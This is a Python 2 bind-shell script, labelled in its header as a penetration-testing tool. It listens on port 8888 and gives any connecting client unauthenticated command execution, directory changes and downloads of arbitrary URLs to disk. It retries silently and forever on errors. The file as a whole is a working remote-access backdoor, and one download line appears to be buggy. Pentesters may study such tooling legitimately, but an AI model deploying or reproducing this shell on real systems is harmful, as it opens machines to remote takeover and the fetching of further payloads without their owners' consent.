#!/usr/bin/env python


#**************************************************************************#
#  Filename: py_bind_shel.py            (Created: 2016-08-14)              #
#                                       (Updated: 2016-10-02)              #
#  Info:                                                                   #
#    TBG Security Python BIND Shell for pentest                            #
#  Author:                                                                 #
#    Ryan Hays                                                             #
#**************************************************************************#


import socket
import os
import thread
import subprocess
import urllib2


def connection(conn):
    conn.setblocking(1)
    conn.send('Connection Established!')
    while True:
            conn.send('\n$')
            data = conn.recv(1024)

            if data.strip('\r\n') == 'quit' or data.strip('\r\n') == 'exit':
                    conn.close()
                    break
            elif data.strip('\r\n').startswith('cd'):
                    try:
                            os.chdir(data.strip('\r\n')[3:])
                    except:
                            conn.send('The system path cannot be found!')
            elif data.strip('\r\n').startswith('wget'):
                    try:
                            f = open(os.path.basename(data[5:]), "wb")
                            f.write(urllib2.urlopen(data[5:]))
                            f.close()
                            conn.send("Successfully downloaded %s" % os.path.basename(data[5:]))
                    except:
                            conn.send("Download failed!")
            else:
                    proc = subprocess.Popen(data.strip('\r\n'), shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdoutput = proc.stdout.read() + proc.stderr.read()
                    conn.send(stdoutput)


while True:
    try:
            s = socket.socket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            s.bind(('', 8888))
            s.listen(5)

            while True:
                    s.settimeout(2)
                    try:
                            conn, addr = s.accept()

                    except socket.timeout:
                            continue

                    if (conn):
                            s.settimeout(None)
                            thread.start_new_thread(connection, (conn,))
    except:
            pass